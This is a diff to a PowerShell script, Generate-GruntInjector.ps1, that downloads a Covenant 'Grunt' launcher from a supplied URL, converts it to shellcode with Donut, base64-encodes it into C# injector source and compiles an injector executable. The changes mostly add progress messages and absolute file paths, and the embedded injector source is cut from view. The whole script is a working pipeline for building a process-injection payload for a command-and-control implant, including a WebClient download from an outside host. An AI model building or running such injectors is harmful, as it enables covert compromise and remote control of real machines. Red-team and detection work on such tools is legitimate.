@@ -60,7 +60,7 @@ param(
     # Example: "C:\Windows\Temp\injector.exe"
     [Parameter(Mandatory = $false)]
     [String]
-    $Outfile = "GruntInjector_$(Get-Date -Format `
+    $Outfile = "$(Get-Location)\GruntInjector_$(Get-Date -Format `
         "yyyy-MM-dd_HH.mm.ss")_v$DotNetFrameworkVersion.exe",
 
     [Parameter(Mandatory = $false)]
@@ -69,8 +69,8 @@ param(
     $Help
 )
 begin {
+    "[*] Generate-GruntInjector.ps1"
     if ($Help) {
-        "[*] Generate-GruntInjector.ps1"
         "[*] Flags:"
         "[**] -LauncherURL"
         "[***] Description: URL of the Grunt binary launcher"
@@ -104,26 +104,29 @@ begin {
         throw "[!] Invalid .NET Framework Version: should be 3.5 or 4.0"
     }
     $ErrorActionPreference = "Stop"
-    $LauncherAssemblyPath = "GruntLauncher.exe"
-    $LauncherShellcodePath = "GruntLauncher.bin"
+    $LauncherAssemblyPath = "$(Get-Location)\GruntLauncher.exe"
+    $LauncherShellcodePath = "$(Get-Location)\GruntLauncher.bin"
 }
 process {
 
     # Download Grunt binary launcher for Covenant server or assign file path from input file
     if ($LauncherURL) {
-        (New-Object Net.WebClient).DownloadFile($LauncherURL, $LauncherAssemblyPath)
+        "[*] Downloading binary launcher"
+        $LauncherAssembly = (New-Object Net.WebClient).DownloadFile($LauncherURL, $LauncherAssemblyPath)
     }
     else {
         $LauncherAssemblyPath = $InputFile
     }
 
     # Use Donut to translate the binary launcher on disk into shellcode
+    "[*] Converting binary launcher to shellcode"
     Invoke-Expression -Command "& '$DonutPath' $LauncherAssemblyPath -o $LauncherShellcodePath" | Out-Null
 
     # Base 64 encode shellcode
     $Base64Shellcode = ([System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("$LauncherShellcodePath")))
 
     # Insert base 64 encoded shellcode into GruntInjector.cs
+    "[*] Inserting shellcode into injector source"
     $GruntInjectorSource = @"
     using System;
     using System.Diagnostics;
@@ -315,26 +318,30 @@ process {
 "@
 
     # Compile injector source code
+    "[*] Compiling injector source under csc.exe, .NET Framework v$DotNetFrameworkVersion"
     $CompilerOptions = New-Object "System.Collections.Generic.Dictionary``2[System.String, System.String]"
     $CompilerOptions.Add("CompilerVersion", "v$DotNetFrameworkVersion")
     $Provider = New-Object Microsoft.CSharp.CSharpCodeProvider $CompilerOptions
     $CompilerParameters = New-Object System.CodeDom.Compiler.CompilerParameters
-    $CompilerParameters.ReferencedAssemblies.Add("System.dll")
+    $CompilerParameters.ReferencedAssemblies.Add("System.dll") | Out-Null
     $CompilerParameters.GenerateExecutable = $true 
     $CompilerParameters.OutputAssembly = $Outfile
     $Result = $Provider.CompileAssemblyFromSource($CompilerParameters, $GruntInjectorSource)
     if ($Result.Errors) {
         ForEach ($Error in $Result.Errors) {
-            Write-Host "[!] $Error in compilation: $Error"
+            "[!] $Error in compilation: $Error"
         }
     }
     else {
-        Write-Host "[*] Path to injector: $($Result.PathToAssembly)"
+        "[*] Success!"
+        "[*] Path to injector: $($Result.PathToAssembly)"
     }
 }
 end {
+    "[*] Cleaning up..."
     if (-not $InputFile) {
         Remove-Item -Path $LauncherAssemblyPath
     }
     Remove-Item -Path $LauncherShellcodePath
+    "[*] Done!"
 }
